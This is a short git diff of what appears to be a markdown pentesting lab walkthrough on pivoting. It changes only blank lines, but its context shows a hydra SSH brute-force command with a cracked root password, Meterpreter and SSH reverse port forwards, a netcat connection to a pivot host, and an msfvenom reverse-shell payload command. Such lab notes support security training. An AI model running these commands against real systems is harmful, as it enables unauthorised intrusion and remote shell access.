@@ -44,6 +44,7 @@ hydra -l root -P /usr/share/wordlists/metasploit/burnett_top_1024.txt 127.0.0.1 
 **root : michael1**
 
 - SSH into Target1 (with the portforward still running):
+
 ```bash
 ssh root@localhost -p 2222
 
@@ -58,6 +59,7 @@ IP's changed
 4.)Extra challenge: Try sending a reverse shell from the first target back to the Kali machine:
 
 - Set up reverse port forward (on the pivot machine)
+
 ```bash
 portfwd add -R -L <KALI IP> -l 6666 -r 7777
 
@@ -71,6 +73,7 @@ ssh -R <Windows 7 Internal Network IP>:<Windows 7 Unused Port>:<Kali Linux Local
 - Start listener locally on port 6666 (on Kali)
 
 - On target 1, netcat to pivot machine on 7777 (or use a msfvenom payload with port 7777)
+
 ```bash
 nc 10.102.32.119 7777
 
@@ -80,6 +83,7 @@ nc 10.102.32.119 7777
 - Go to <http://10.102.43.238>
 
 - Create msfvenom payload:
+
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.102.184.68 LPORT=9000 -f elf -o reverse.elf
 
